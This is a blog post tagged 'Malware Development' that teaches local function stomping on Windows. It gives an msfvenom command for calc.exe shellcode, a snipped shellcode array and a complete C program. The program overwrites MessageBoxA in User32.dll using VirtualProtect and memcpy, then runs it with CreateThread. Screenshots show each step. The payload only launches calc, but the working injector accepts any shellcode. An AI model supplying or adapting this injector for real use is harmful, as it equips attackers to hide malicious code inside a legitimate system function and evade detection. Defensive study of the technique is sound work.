---
layout: post
title: "Local Function Stomping Injection"
date: 2024-07-29 13:47:00 +0000
tags: [Malware Development]
categories: [Malware Development]
---


<!-- # Local Function Stomping Injection  -->

Function Stomping
-------

Function stomping typically refers to overwriting the code or data of a function with different content in its memory space. This can be done to modify the behavior of the function to run as intended by the programmer.

for our purpose of stomping, we will use [MessageBoxA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa#remarks) which would be a better choice because this function is not widely used by operating system or other services. As per Microsoft Documentation MessageBoxA is exported using User32.dll

Firstly, we use msfvenom to create our calc shellcode, which we’ll use to overwrite the memory of messageboxA.

`msfvenom -p windows/x64/exec CMD=calc.exe -f c`

```
char shellcode[] = 
	{ 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50
,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52
,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a
,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41
-------------------<snip> ---------------------------
,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd
,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0
,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff
,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
SIZE_T szshellcode= sizeof(shellcode);
```


After defining an array for the shellcode, our next step is to obtain the address of MessageBoxA. To do this, we begin by loading User32.dll using the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function.

```c
HMODULE hmodule = LoadLibraryA("User32.dll");
```


After obtaining the handle to our DLL, we can use [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) to fetch the address of our exported function.

```c
FARPROC Paddress = GetProcAddress(hmodule, "MessageBoxA");
```

![user32_messageboxa](/assets/img/local_function_stomping/user32_messageboxa.webp)

![textsection_permsission](/assets/img/local_function_stomping/textsection_permission.webp)

Once we have obtained the address of our target function, we need to adjust the permissions to allow writing to that memory page. This is necessary because MessageBoxA resides in the .text section of user32.dll, where memory permissions are typically set to Execute Read Only.

To enable writing to that address, we can adjust the page protection using the [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) function with the PAGE\_READWRITE protection.

```c
if (!VirtualProtect(Paddress, szshellcode, PAGE_READWRITE, &oldprotection)) {
					printf(" virtualprotect failed with errorno %d\\n", GetLastError());
}
```


After successfully changing the permissions to ReadWrite, we can then copy our shellcode, generated from msfvenom, to the address of MessageBoxA simply by using memcpy

```c
memcpy(Paddress, shellcode, szshellcode);
```


Now, we can revert the page permissions back to their original state, which was Execute Read, using VirtualProtect.

```c
VirtualProtect(Paddress, szshellcode, PAGE_EXECUTE_READ, &oldprotection);
```


Afterwards, we can use the [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) function to create a new thread that calls the MessageBoxA function, which in turn executes our calc shellcode

```c
CreateThread(NULL, NULL, Paddress, NULL, NULL, NULL);
```


The complete code appears as follows:

```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <Windows.h>
    BOOL stomper(FARPROC Paddress, char* shellcode, SIZE_T szshellcode) {
    DWORD oldprotection = NULL;
    //changing page permission
    if (!VirtualProtect(Paddress, szshellcode, PAGE_READWRITE, &oldprotection)) {
    printf("virtualprotect ReadWrite failed with errorno %d\\n", GetLastError());
    return FALSE;
    }
    //copy shellcode to stomping function address (MessageboxA)
    memcpy(Paddress, shellcode, szshellcode);
    //changing page permission to original
    if (!VirtualProtect(Paddress, szshellcode, PAGE_EXECUTE_READ, &oldprotection)) {
    printf("virtualprotect Execute_Read failed with errorno %d\\n", GetLastError());
    return FALSE;
    }
    return TRUE;
    }
    int main() {
    FARPROC Paddress;
    HMODULE hmodule;
    char shellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50
    ,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52
    -------------------<snip>------------------------
    ,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0
    ,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff
    ,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
    hmodule = LoadLibraryA("User32.dll");
    if (hmodule == NULL) {
    printf("cannot get handlue to the module\\n");
    goto end;
    }
    Paddress = GetProcAddress(hmodule, "MessageBoxA");
    if (Paddress == NULL) {
    printf("cannot get handle to MessageBoxA\\n");
    goto end;
    }
    printf("The address of MessageboxA is 0x%p\\n", Paddress);
    if (stomper(Paddress, shellcode, sizeof(shellcode))) {
    printf("Shellcode successfully injected.\\n");
    }
    else {
    printf("Shellcode injection failed.\\n");
    goto end;
    }
    //create a thread to execute calc shellcode
    HANDLE hThread = CreateThread(NULL, NULL, Paddress, NULL, NULL, NULL);
    if (hThread == NULL) {
    printf("CreateThread failed with error %d\\n", GetLastError());
    goto end;
    }
    end:
    printf("Press Enter to exit: ");
    getchar();
    }
```


EXECUTION
----------

Getting address of MessageBoxA.

![address_messageboxa](/assets/img/local_function_stomping/address_messageboxA.webp)

Before changing the permission of the page where messageboxA lies i.e. on .text section.

![before_permission](/assets/img/local_function_stomping/before_permission.webp)

After changing the page permission to Read write.

![after_permission](/assets/img/local_function_stomping/after_permission.webp)

Before overwriting the messageboxA with shellcode

![before_overwriting](/assets/img/local_function_stomping/before_writing.webp)

After writing the shellcode

![after_overwriting](/assets/img/local_function_stomping/after_writing.webp)

Completing the Execution

![completing](/assets/img/local_function_stomping/completing.webp)

<!-- **References:**

[LoadLibraryA function (libloaderapi.h) — Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)

[VirtualProtect function (memoryapi.h) — Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

[Function Stomping Injection | Hacking (gitbook.io)](https://sergio-f20-notes.gitbook.io/hacking/4.-exploitation/payloads-file-transfer-coding-maldev-exploitdev/windows-maldev/function-stomping-injection)

[MessageBoxA function (winuser.h) — Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa#remarks)

[GetProcAddress function (libloaderapi.h) — Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) -->